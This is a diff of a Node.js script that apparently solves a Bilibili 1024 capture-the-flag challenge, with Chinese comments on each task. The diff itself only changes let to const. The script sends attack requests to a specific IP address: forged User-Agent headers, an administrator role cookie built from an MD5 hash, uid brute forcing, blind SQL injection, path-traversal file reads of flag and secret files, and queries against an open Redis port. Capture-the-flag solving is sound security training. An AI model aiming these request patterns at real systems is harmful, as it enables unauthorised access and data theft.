@@ -4,13 +4,13 @@ const redis = require("redis");
 let session = ""; // 此处填写个人 session
 
 // 第一题 - 查源码 + 查请求
-let func1 = function () {
-  let url = "http://45.113.201.36/api/admin";
-  let headers = {
+const func1 = function () {
+  const url = "http://45.113.201.36/api/admin";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `session=${session}`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       console.log("flag1:", body.data);
     }
@@ -27,13 +27,13 @@ let func1 = function () {
 };
 
 // 第二题 - 修改UA
-let func2 = function () {
-  let url = "http://45.113.201.36/api/ctf/2";
-  let headers = {
+const func2 = function () {
+  const url = "http://45.113.201.36/api/ctf/2";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `session=${session}`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       console.log("flag2:", body.data);
     }
@@ -50,14 +50,14 @@ let func2 = function () {
 };
 
 // 第三题
-let func3 = function () {
-  let url = "http://45.113.201.36/api/ctf/3";
-  let role = "ee11cbb19052e40b07aac0ca060c23ee"; // 即 'user' 的 MD5 字符串, 题目提供，不需要修改，但可以给下一题做参考。
-  let headers = {
+const func3 = function () {
+  const url = "http://45.113.201.36/api/ctf/3";
+  const role = "ee11cbb19052e40b07aac0ca060c23ee"; // 即 'user' 的 MD5 字符串, 题目提供，不需要修改，但可以给下一题做参考。
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       console.log("flag3:", body.data);
     }
@@ -74,14 +74,14 @@ let func3 = function () {
 };
 
 // 第四题 - 修改Cookie - role
-let func4 = function () {
-  let url = "http://45.113.201.36/api/ctf/4";
-  let role = "7b7bc2512ee1fedcd76bdc68926d4f7b"; // 即 'Administrator' 的 MD5 字符串, 需要修改。
-  let headers = {
+const func4 = function () {
+  const url = "http://45.113.201.36/api/ctf/4";
+  const role = "7b7bc2512ee1fedcd76bdc68926d4f7b"; // 即 'Administrator' 的 MD5 字符串, 需要修改。
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       console.log("flag4:", body.data);
     }
@@ -98,11 +98,11 @@ let func4 = function () {
 };
 
 // 第五题 - 暴力破解
-let func5 = function () {
+const func5 = function () {
   let uid = 100336889; // 初始 uid，题目源码中有提供。
   let url = `http://45.113.201.36/api/ctf/5?uid=${uid}`;
-  let role = "ee11cbb19052e40b07aac0ca060c23ee";
-  let headers = {
+  const role = "ee11cbb19052e40b07aac0ca060c23ee";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
@@ -137,10 +137,10 @@ let func5 = function () {
 };
 
 // 第六题 - SQL注入
-let func6 = function () {
-  let url = "http://45.113.201.36/blog/single.php?id=1";
+const func6 = function () {
+  const url = "http://45.113.201.36/blog/single.php?id=1";
   let flag = "";
-  let role = "ee11cbb19052e40b07aac0ca060c23ee";
+  const role = "ee11cbb19052e40b07aac0ca060c23ee";
 
   for (let i = 1; i <= 100; i++) {
     let left = 33;
@@ -179,14 +179,14 @@ let func6 = function () {
 };
 
 // 第七题 - 任意文件读取
-let func7 = function () {
-  let url = "http://45.113.201.36/api/images?file=../../../flag7.txt";
-  let role = "7b7bc2512ee1fedcd76bdc68926d4f7b";
-  let headers = {
+const func7 = function () {
+  const url = "http://45.113.201.36/api/images?file=../../../flag7.txt";
+  const role = "7b7bc2512ee1fedcd76bdc68926d4f7b";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       // 文件读取
     }
@@ -203,7 +203,7 @@ let func7 = function () {
 };
 
 // 第八题 - 查Redis
-let func8 = function () {
+const func8 = function () {
   const client = redis.createClient(6379, "45.113.201.36");
   const callback = function () {
     client.get("flag8", function (err, reply) {
@@ -216,14 +216,14 @@ let func8 = function () {
 };
 
 // 第九题 - 任意文件读取 + 密钥解密
-let func9 = function () {
-  let url = "http://45.113.201.36/api/images?file=../../../secret.txt";
-  let role = "ee11cbb19052e40b07aac0ca060c23ee";
-  let headers = {
+const func9 = function () {
+  const url = "http://45.113.201.36/api/images?file=../../../secret.txt";
+  const role = "ee11cbb19052e40b07aac0ca060c23ee";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       // 得到加密字符串，该字符串解密后即为 flag
     }
@@ -240,14 +240,14 @@ let func9 = function () {
 };
 
 // 第十题 - Meta Type
-let func10 = function () {
-  let url = "http://45.113.201.36/blog/end.php?id[]=&url=flag.txt"; // dirsearch 后，得知存在 /blog/test.php，返回内容为 jsfuck 编码的 JS 代码，转义后为var str1 = "程序员最多的地方"; var str2 = "bilibili1024havefun"; console.log()。Github 上找到对应仓库后根据提示得到该URL。
-  let role = "ee11cbb19052e40b07aac0ca060c23ee";
-  let headers = {
+const func10 = function () {
+  const url = "http://45.113.201.36/blog/end.php?id[]=&url=flag.txt"; // dirsearch 后，得知存在 /blog/test.php，返回内容为 jsfuck 编码的 JS 代码，转义后为var str1 = "程序员最多的地方"; var str2 = "bilibili1024havefun"; console.log()。Github 上找到对应仓库后根据提示得到该URL。
+  const role = "ee11cbb19052e40b07aac0ca060c23ee";
+  const headers = {
     "User-Agent": "bilibili Security Browser",
     Cookie: `role=${role}; session=${session};`,
   };
-  let callback = function (error, response, body) {
+  const callback = function (error, response, body) {
     if (!error && response.statusCode == 200) {
       // 返回图片，通过二进制文件查看器可以发现隐藏的flag
     }
